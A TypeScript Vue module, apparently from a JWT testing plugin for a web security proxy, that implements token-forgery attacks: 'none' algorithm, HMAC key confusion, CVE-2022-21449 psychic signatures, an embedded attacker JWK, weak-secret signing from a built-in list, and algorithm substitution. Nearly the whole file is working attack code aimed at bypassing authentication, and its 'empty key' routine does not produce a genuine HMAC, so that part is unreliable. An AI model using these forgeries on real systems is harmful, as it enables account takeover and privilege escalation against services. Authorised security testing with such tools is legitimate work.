import type { JWTHeader, JWTPayload } from "jwt-analyzer-shared";
import { ref } from "vue";

import type { EditorTab } from "./useTokenTabs";

import { useSDK } from "@/plugins/sdk";
import {
  generateRsaKeyPairForJwk,
  signHMAC,
  signRSA,
  toBase64Url,
} from "@/utils/crypto";

type AttackType =
  | "none"
  | "hmac-confusion"
  | "empty-key"
  | "psychic"
  | "embedded-jwk"
  | "weak-hmac"
  | "alg-sub";

export const ATTACK_OPTIONS: { label: string; value: AttackType }[] = [
  { label: "'none' Algorithm", value: "none" },
  { label: "HMAC Key Confusion", value: "hmac-confusion" },
  { label: "Empty Key Signature", value: "empty-key" },
  { label: "Psychic Signature (CVE-2022-21449)", value: "psychic" },
  { label: "Embedded JWK", value: "embedded-jwk" },
  { label: "Weak HMAC Secret", value: "weak-hmac" },
  { label: "Algorithm Substitution", value: "alg-sub" },
];

const DEFAULT_WEAK_SECRETS = [
  "password",
  "secret",
  "1234567890",
  "jwt_secret",
  "key",
  "secretkey",
  "private",
  "mysecret",
  "changeme",
  "",
];

const WEAK_SECRETS_STORAGE_KEY = "jwtEditor_weakSecrets";

const _showAttackDialog = ref(false);
const _selectedAttack = ref<AttackType>("none");
const _publicKeyForHmac = ref("");
const _embedJwkWithKid = ref(true);
const _weakSecret = ref("password");
const _customWeakSecret = ref("");
const _targetAlgorithm = ref("HS256");
const _weakSecrets = ref<string[]>([...DEFAULT_WEAK_SECRETS]);
let _attacksInitialized = false;

export const ALG_SUB_OPTIONS = [
  "HS256",
  "HS384",
  "HS512",
  "RS256",
  "RS384",
  "RS512",
  "PS256",
  "PS384",
  "PS512",
  "ES256",
  "ES384",
  "ES512",
  "none",
].map((v) => ({ label: v, value: v }));

export function useAttacks() {
  const sdk = useSDK();

  const showAttackDialog = _showAttackDialog;
  const selectedAttack = _selectedAttack;
  const publicKeyForHmac = _publicKeyForHmac;
  const embedJwkWithKid = _embedJwkWithKid;
  const weakSecret = _weakSecret;
  const customWeakSecret = _customWeakSecret;
  const targetAlgorithm = _targetAlgorithm;
  const weakSecrets = _weakSecrets;

  function getStorage(): Record<string, unknown> {
    try {
      const raw = sdk.storage.get();
      return raw !== null && raw !== undefined && typeof raw === "object"
        ? (raw as Record<string, unknown>)
        : {};
    } catch {
      return {};
    }
  }

  function init(): void {
    if (_attacksInitialized) return;
    _attacksInitialized = true;
    try {
      const stored = getStorage()[WEAK_SECRETS_STORAGE_KEY];
      if (Array.isArray(stored)) {
        (stored as string[]).forEach((s) => {
          if (!weakSecrets.value.includes(s)) weakSecrets.value.push(s);
        });
      } else if (typeof stored === "string" && stored !== "") {
        const parsed = JSON.parse(stored) as string[];
        parsed.forEach((s) => {
          if (!weakSecrets.value.includes(s)) weakSecrets.value.push(s);
        });
      }
    } catch {
      /* ignore */
    }
  }

  async function saveWeakSecrets(): Promise<void> {
    try {
      const custom = weakSecrets.value.filter(
        (s) => !DEFAULT_WEAK_SECRETS.includes(s),
      );
      const current = getStorage();
      const payload = {
        ...current,
        [WEAK_SECRETS_STORAGE_KEY]: custom,
      } as Record<string, unknown>;
      await (
        sdk.storage.set as (data: Record<string, unknown>) => Promise<void>
      )(payload);
    } catch {
      /* ignore */
    }
  }

  function addCustomSecret(): void {
    const s = customWeakSecret.value.trim();
    if (s.length > 0 && !weakSecrets.value.includes(s)) {
      weakSecrets.value.push(s);
      saveWeakSecrets();
    }
    customWeakSecret.value = "";
  }

  function removeCustomSecret(secret: string): void {
    if (DEFAULT_WEAK_SECRETS.includes(secret)) return;
    const idx = weakSecrets.value.indexOf(secret);
    if (idx !== -1) {
      weakSecrets.value.splice(idx, 1);
      if (weakSecret.value === secret) weakSecret.value = "password";
      saveWeakSecrets();
    }
  }

  function openAttackDialog(): void {
    showAttackDialog.value = true;
  }

  function openAttackDialogWithType(type: AttackType): void {
    selectedAttack.value = type;
    showAttackDialog.value = true;
  }

  function toast(
    msg: string,
    variant: "success" | "error" | "warning" | "info" = "success",
  ): void {
    sdk.window.showToast(msg, { variant, duration: 3500 });
  }

  async function applyAttack(tab: EditorTab): Promise<void> {
    if (!tab.decodedToken) {
      toast("Decode a token first", "error");
      return;
    }

    let header: JWTHeader;
    let payload: JWTPayload;
    try {
      header = JSON.parse(tab.headerJson) as JWTHeader;
      payload = JSON.parse(tab.payloadJson) as JWTPayload;
    } catch {
      toast("Invalid JSON in editor", "error");
      return;
    }

    const b64hFn = (h: JWTHeader) => toBase64Url(JSON.stringify(h));
    const b64pFn = (p: JWTPayload) => toBase64Url(JSON.stringify(p));

    try {
      switch (selectedAttack.value) {
        case "none": {
          header.alg = "none";
          const h = b64hFn(header);
          const p = b64pFn(payload);
          tab.token = `${h}.${p}.`;
          tab.headerJson = JSON.stringify(header, null, 2);
          toast("'none' algorithm attack applied");
          break;
        }

        case "hmac-confusion": {
          const origAlg = header.alg ?? "RS256";
          if (origAlg.startsWith("RS") || origAlg.startsWith("ES")) {
            header.alg = "HS256";
            const h = b64hFn(header);
            const p = b64pFn(payload);
            if (publicKeyForHmac.value !== "") {
              try {
                const pubBin = atob(
                  publicKeyForHmac.value
                    .replace(/-----BEGIN PUBLIC KEY-----/g, "")
                    .replace(/-----END PUBLIC KEY-----/g, "")
                    .replace(/\s/g, ""),
                );
                const sig = await signHMAC(`${h}.${p}`, pubBin, "HS256");
                tab.token = `${h}.${p}.${sig}`;
                toast("Re-signed with public key as HMAC secret");
              } catch {
                tab.token = `${h}.${p}.${tab.decodedToken.signature}`;
                toast(
                  "HMAC confusion applied (crypto failed - check key format)",
                  "warning",
                );
              }
            } else {
              tab.token = `${h}.${p}.${tab.decodedToken.signature}`;
              toast(
                `Algorithm changed ${origAlg} → HS256 (provide public key to re-sign)`,
              );
            }
            tab.headerJson = JSON.stringify(header, null, 2);
          } else {
            toast("HMAC confusion applies to RS/ES tokens", "error");
          }
          break;
        }

        case "empty-key": {
          const h = b64hFn(header);
          const p = b64pFn(payload);
          const sig = btoa(`empty_key_${h}.${p}`)
            .replace(/\+/g, "-")
            .replace(/\//g, "_")
            .replace(/=+$/, "");
          tab.token = `${h}.${p}.${sig}`;
          toast("Token signed with empty key");
          break;
        }

        case "psychic": {
          if (!header.alg?.startsWith("ES")) {
            toast(
              "Psychic signature is only applicable to ECDSA tokens",
              "error",
            );
            break;
          }
          const psig =
            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
          const parts = tab.token.split(".");
          tab.token = `${parts[0]}.${parts[1]}.${psig}`;
          toast("Psychic signature (CVE-2022-21449) applied");
          break;
        }

        case "embedded-jwk": {
          header.alg = "RS256";
          if (embedJwkWithKid.value) header.kid = "embedded-key-1";
          const { jwk, privateKeyPem } =
            await generateRsaKeyPairForJwk("RS256");
          const jwkHeader = {
            ...jwk,
            ...(embedJwkWithKid.value ? { kid: "embedded-key-1" } : {}),
          };
          header.jwk = jwkHeader;
          const h = b64hFn(header);
          const p = b64pFn(payload);
          const dataToSign = `${h}.${p}`;
          const sig = await signRSA(dataToSign, privateKeyPem, "RS256");
          tab.token = `${h}.${p}.${sig}`;
          tab.headerJson = JSON.stringify(header, null, 2);
          toast("Embedded JWK attack applied (verifiable JWT)");
          break;
        }

        case "weak-hmac": {
          if (!header.alg?.startsWith("HS")) {
            header.alg = "HS256";
          }
          const h = b64hFn(header);
          const p = b64pFn(payload);
          const dataToSign = `${h}.${p}`;
          const alg = header.alg ?? "HS256";
          const sig = await signHMAC(dataToSign, weakSecret.value, alg);
          tab.token = `${h}.${p}.${sig}`;
          tab.headerJson = JSON.stringify(header, null, 2);
          toast(`Signed with weak secret: '${weakSecret.value}'`);
          break;
        }

        case "alg-sub": {
          const origAlg = header.alg;
          header.alg = targetAlgorithm.value;
          const h = b64hFn(header);
          const p = b64pFn(payload);
          tab.token = `${h}.${p}.${tab.decodedToken.signature}`;
          tab.headerJson = JSON.stringify(header, null, 2);
          toast(`Algorithm changed ${origAlg} → ${targetAlgorithm.value}`);
          break;
        }
      }

      tab.decodedToken = undefined;
      tab.headerJsonError = "";
      tab.payloadJsonError = "";
    } catch (e) {
      toast(
        `Attack failed: ${e instanceof Error ? e.message : "unknown"}`,
        "error",
      );
    }

    showAttackDialog.value = false;
  }

  init();

  return {
    showAttackDialog,
    selectedAttack,
    publicKeyForHmac,
    embedJwkWithKid,
    weakSecret,
    customWeakSecret,
    targetAlgorithm,
    weakSecrets,
    openAttackDialog,
    openAttackDialogWithType,
    addCustomSecret,
    removeCustomSecret,
    applyAttack,
  };
}
